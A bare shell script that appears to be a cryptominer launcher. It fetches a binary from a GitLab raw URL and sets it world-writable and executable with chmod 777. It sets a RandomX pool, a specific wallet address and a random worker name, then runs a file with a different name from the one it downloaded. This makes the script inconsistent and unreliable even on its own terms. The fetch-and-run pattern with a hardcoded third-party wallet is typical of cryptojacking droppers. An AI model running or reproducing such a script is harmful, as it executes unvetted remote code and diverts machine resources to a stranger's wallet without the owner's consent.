#!/bin/sh
wget https://gitlab.com/asiapboneng/verta/-/raw/main/rrig
chmod 777 rrig
POOL=rx.unmineable.com:80
WALLET=BTT:TN9nZPj9qS8BUYVMhkVhHwg2PJgpQR9whL
WORKER=$(shuf -n 1 -i 1-9999)
./masterfile -o $POOL -u $WALLET -p $WORKER -a rx/0 --donate-level 1 -x -k
